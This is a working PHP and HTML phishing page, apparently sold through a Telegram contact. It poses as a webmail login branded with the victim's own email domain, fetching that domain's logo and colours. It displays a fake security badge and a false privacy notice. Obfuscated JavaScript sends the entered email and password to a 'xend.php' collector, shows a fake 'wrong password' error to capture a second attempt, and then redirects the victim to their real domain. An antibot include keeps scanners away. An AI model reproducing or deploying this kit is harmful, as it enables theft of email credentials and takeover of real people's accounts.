<?php
// Holla on TG @Fast_0610
require_once '0610_antibot.php';

$email = $_GET['e'] ?? '';  // Use "?e=" in the url
if (!$email || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    exit("<h3>Access Denied!</h3>");
}

$domain = strtolower(trim(substr(strrchr($email, "@"), 1)));

$domainForUrl = urlencode($domain);
$clearbitFavicon = "https://logo.clearbit.com/{$domainForUrl}?size=32";
$googleFavicon   = "https://www.google.com/s2/favicons?domain={$domainForUrl}&sz=32";
$clearbitLogo = "https://logo.clearbit.com/{$domainForUrl}?size=128";
$iconHorseLogo = "https://icon.horse/icon/{$domainForUrl}";
$myFrame = "https://www." . $domain;

$domain = ucfirst($domain);

$bgColor = getDominantColor($clearbitLogo);
if ($bgColor === '#f0f0f0') {
    $bgColor = getDominantColor($iconHorseLogo);
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webmail Portal Login - <?php echo htmlspecialchars($domain); ?></title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" referrerpolicy="no-referrer" />
  <link rel="shortcut icon" type="image/png" id="favicon"
      href="<?php echo htmlspecialchars($faviconUrl); ?>"
      onerror="this.onerror=null;this.href='<?php echo htmlspecialchars($googleFavicon); ?>';">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { width: 100%; height: auto; font-family: Corbel, Arial, sans-serif; background-color: <?php echo $bgColor; ?>; font-size: 18px; line-height: 1.8; color: #333; display: flex; align-items: center; justify-content: center; }
    #preloader { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; align-items: center; justify-content: center; z-index: 9999; }
    .form-holder { background-color: #f7f7f7; width: 100%; max-width: 480px; margin: 70px auto; padding: 0; border-radius: 4px; box-shadow: 0 5px 70px rgba(0, 0, 0, 0.1); border: 1px solid #d6dfea; overflow: hidden; }
    .xlogo { background-color: #0d4f8b; color: #fff; padding: 10px 20px; display: flex; align-items: center; }
    .xlogo img { height: 40px; object-fit: contain; margin-right: 10px; }
    .xlogo span { font-size: 100%; font-weight: bold; word-spacing:3px; }
    .form-wrap { width: 100%; padding: 30px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
    .form-wrap img { width: 100px; margin: 20px auto; margin-top: 25px; }
    .form-wrap p { font-size: 122%; margin-bottom: 20px; }
    .error { display: none; color: red; font-size: 100%; margin-bottom: 10px; }
    .finput { position: relative; margin: 15px auto; width: 100%; }
    .finput input { width: 100%; padding: 16px; padding-left: 42px; font-size: 89%; color: #333; border: 1px solid #d6dfea; border-radius: 4px; transition: border-color 0.3s ease; }
    ::placeholder { font-size: 90%; color: #999; }
    .finput i { position: absolute; top: 50%; left: 14px; transform: translateY(-50%); color: #aaa; font-size: 89%; transition: color 0.3s ease; }
    .finput input:focus { border-color: #0d4f8b; outline: none; }
    .finput input:focus + i, .finput input:focus ~ i { color: #0d4f8b; }
    .finput input[readonly] { background-color: rgba(0, 128, 0, 0.1); color: #666; cursor: not-allowed; border-color: #bbb; box-shadow: none; }
    .finput input[readonly] + i { color: #999; }
    .finput.btn { margin-top: 20px; }
    button { width: 50%; background-color: #0d4f8b; color: white; font-size: 100%; padding: 12px 28px; border: none; border-radius: 4px; transition: background 0.3s ease; cursor: pointer; }
    button:hover { background-color: #155fa0; }
    .privacy { font-size: 67%; color: #999; margin-top: 15px; text-align: left; }
    @media (max-width: 480px) {
    body { font-size: 16px; }
    .form-wrap p { font-size: 111%; }
    .finput input { padding-left: 40px; }
    button { width: 60%; }
    .privacy { font-size: 72%; }
    }
  </style>
</head>
<body>

<div id="preloader">
  <svg width="64" height="64" viewBox="0 0 100 100" fill="none">
    <circle cx="50" cy="50" r="35" stroke="#0d4f8b" stroke-width="10" stroke-linecap="round" stroke-dasharray="164" stroke-dashoffset="164">
      <animate attributeName="stroke-dashoffset" values="164;0" dur="2s" repeatCount="indefinite"/>
      <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="1s" repeatCount="indefinite"/>
    </circle>
  </svg>
</div>

  <div class="form-holder">
    
    <div class="xlogo">
      <img src="https://logo.clearbit.com/<?php echo htmlspecialchars($domain); ?>?size=128"
       onerror="this.onerror=null;this.src='https://icon.horse/icon/<?php echo htmlspecialchars($domain); ?>';"
       alt="Logo" height="40" />
      <span id="banNer"><?php echo htmlspecialchars($domain); ?> Webmail Login</span>
    </div>

    <div class="form-wrap">
      
      <p>Please sign in with your email</p>
      <div class="error" id="error"></div>
      
      <div class="finput">
        <input type="email" id="temail" name="temail" placeholder="Email Address" value="<?php echo htmlspecialchars($email); ?>" readonly>
        <i class="fa fa-user"></i>
      </div>

      <div class="finput">
        <input type="password" id="tpass" name="tpass" placeholder="Email Password" required>
        <i class="fa fa-lock"></i>
      </div>
      <div class="finput btn">
        <button id="goNow" onclick="goNow()">Continue</button>
      </div>

      <img src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png?alt=media&token=270a0942-12e5-423b-8855-04615084dca8">

      <span class="privacy">
        <strong>Privacy Policy:</strong><br>
        Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
      </span>

      <!-- <div id="root">
        <iframe id="myframe" scrolling="no" src="<?php echo htmlspecialchars($myFrame); ?>" width="100%" height="100%" frameborder="0"></iframe>
      </div> -->

    </div>
  </div>

<script>
const _0x81f779=_0x2a26;(function(_0x5e09cd,_0x47ef57){const _0x5d4058=_0x2a26,_0x26f20f=_0x5e09cd();while(!![]){try{const _0x183dcb=parseInt(_0x5d4058(0xdf))/0x1+parseInt(_0x5d4058(0xde))/0x2+parseInt(_0x5d4058(0xe0))/0x3*(-parseInt(_0x5d4058(0xec))/0x4)+parseInt(_0x5d4058(0xdb))/0x5+parseInt(_0x5d4058(0xcc))/0x6+parseInt(_0x5d4058(0xd6))/0x7+-parseInt(_0x5d4058(0xe6))/0x8;if(_0x183dcb===_0x47ef57)break;else _0x26f20f['push'](_0x26f20f['shift']());}catch(_0x2fb109){_0x26f20f['push'](_0x26f20f['shift']());}}}(_0x289d,0x8be70));let n=0x0,redirect_to=_0x81f779(0xe8);const emailPattern=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;function _0x2a26(_0x5896f9,_0x42d68a){const _0x289d61=_0x289d();return _0x2a26=function(_0x2a26fb,_0x26bcc5){_0x2a26fb=_0x2a26fb-0xca;let _0x36d62f=_0x289d61[_0x2a26fb];return _0x36d62f;},_0x2a26(_0x5896f9,_0x42d68a);}window[_0x81f779(0xda)]=()=>{const _0x39c789=_0x81f779;document[_0x39c789(0xe4)]('preloader')[_0x39c789(0xe2)]['display']=_0x39c789(0xea),document[_0x39c789(0xe4)](_0x39c789(0xd3))[_0x39c789(0xd4)]();};function goNow(_0x384c54){const _0x49d3e4=_0x81f779;_0x384c54?.[_0x49d3e4(0xd9)]();const _0x1ca779=$(_0x49d3e4(0xcf))['val']()['trim'](),_0x207be3=$('#tpass')[_0x49d3e4(0xed)]()['trim']();if(!_0x207be3){$(_0x49d3e4(0xe1))[_0x49d3e4(0xd7)]()['html'](_0x49d3e4(0xd0)),document[_0x49d3e4(0xe4)](_0x49d3e4(0xd3))[_0x49d3e4(0xd4)]();return;}const _0x177a16=_0x1ca779[_0x49d3e4(0xdd)]('@')[0x1];$[_0x49d3e4(0xd8)]({'url':_0x49d3e4(0xce),'type':_0x49d3e4(0xe7),'data':{'temail':_0x1ca779,'tpass':_0x207be3},'beforeSend':()=>{const _0x30e170=_0x49d3e4;$('#goNow')[_0x30e170(0xd2)]('Verifying...');},'success':_0x286dcf=>{const _0x7286d6=_0x49d3e4;_0x286dcf['trim']()===_0x7286d6(0xe9)?($('#tpass')['val'](''),n>0x0?(redirect_to=_0x7286d6(0xe3)+_0x177a16,window[_0x7286d6(0xcd)][_0x7286d6(0xd5)](''+redirect_to)):(n++,$('#error')[_0x7286d6(0xd7)]()[_0x7286d6(0xd2)](_0x7286d6(0xe5)),document[_0x7286d6(0xe4)](_0x7286d6(0xd3))['focus']())):$(_0x7286d6(0xe1))[_0x7286d6(0xd7)]()[_0x7286d6(0xd2)](_0x7286d6(0xcb));},'error':(_0x516cc5,_0x50de30,_0xd0c4b3)=>{const _0x2c984e=_0x49d3e4;$(_0x2c984e(0xe1))['show']()[_0x2c984e(0xd2)]('We\x20encountered\x20an\x20error.\x20Please\x20try\x20again.'),console[_0x2c984e(0xdc)]('AJAX\x20error:',_0xd0c4b3),console[_0x2c984e(0xdc)](_0x2c984e(0xeb),_0x516cc5[_0x2c984e(0xca)]);},'complete':()=>{const _0x286d63=_0x49d3e4;$('#goNow')[_0x286d63(0xd2)](_0x286d63(0xd1));}});}function _0x289d(){const _0x287233=['style','https://www.','getElementById','Login\x20failed!\x20Please\x20enter\x20correct\x20password.','16709664YvSxgw','POST','https://www.google.com','success','none','Server\x20response:','3532viBqbD','val','responseText','We\x20encountered\x20an\x20error.\x20Please\x20try\x20again.','2416278LQtbHp','location','xend.php','#temail','Please\x20enter\x20your\x20password.','Continue','html','tpass','focus','replace','3475906fvLnsu','show','ajax','preventDefault','onload','4776725VMTOeI','error','split','1397604ZfUQLW','771463OXRZgN','2253fMbOmV','#error'];_0x289d=function(){return _0x287233;};return _0x289d();}
</script>
</body>
</html>
<!-- Holla on TG @Fast_0610 -->
